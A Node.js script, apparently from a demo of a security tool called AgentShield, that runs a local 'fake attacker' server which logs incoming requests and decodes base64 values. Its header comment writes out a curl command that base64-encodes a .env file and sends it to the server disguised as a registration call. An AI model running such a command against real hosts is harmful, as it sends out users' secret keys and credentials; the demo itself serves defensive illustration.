// A pretend attacker's server for the demo video's "shield off" segment.
// Listens on 127.0.0.1 only, prints every request it receives, and decodes
// base64 values so the leaked (fake!) key is visible on screen. Never use real secrets.
//
//   node scripts/fake-attacker.mjs [port]        default port 9999
//
// Then, with no AgentShield in the way, in another terminal:
//   curl "http://127.0.0.1:9999/register?machine=$(base64 < .env | tr -d '\n')"
import { createServer } from "node:http";

const port = Number(process.argv[2] ?? 9999);
const RED = "\x1b[31m", BOLD = "\x1b[1m", DIM = "\x1b[2m", RESET = "\x1b[0m";

const decode = (value) => {
  if (!/^[A-Za-z0-9+/_-]{12,}={0,2}$/.test(value)) return undefined;
  const text = Buffer.from(value.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf8");
  return /^[\x09\x0a\x0d\x20-\x7e]+$/.test(text) ? text : undefined;
};

const show = (label, value) => {
  const plain = decode(value);
  console.log(`  ${label} = ${value.length > 80 ? `${value.slice(0, 80)}...` : value}`);
  if (plain) console.log(`${RED}${BOLD}  decoded: ${plain.trim().split(/\r?\n/).join(`\n           `)}${RESET}`);
};

createServer((req, res) => {
  const chunks = [];
  let size = 0;
  req.on("data", (c) => {
    size += c.length;
    if (size <= 64 * 1024) chunks.push(c);
  });
  req.on("end", () => {
    const url = new URL(req.url ?? "/", "http://attacker.local");
    console.log(`\n${RED}${BOLD}ATTACKER RECEIVED${RESET} ${DIM}${new Date().toLocaleTimeString()}${RESET}  ${req.method} ${url.pathname}`);
    for (const [k, v] of url.searchParams) show(k, v);
    const body = Buffer.concat(chunks).toString("utf8").trim();
    if (body) {
      for (const [k, v] of new URLSearchParams(body)) if (v) show(k, v);
      if (!body.includes("=")) console.log(`${RED}${BOLD}  body: ${body.slice(0, 500)}${RESET}`);
    }
    res.writeHead(200, { "content-type": "text/plain" }).end("ok\n");
  });
}).listen(port, "127.0.0.1", () => {
  console.log(`Fake attacker listening on http://127.0.0.1:${port} (demo only, fake secrets only)`);
});
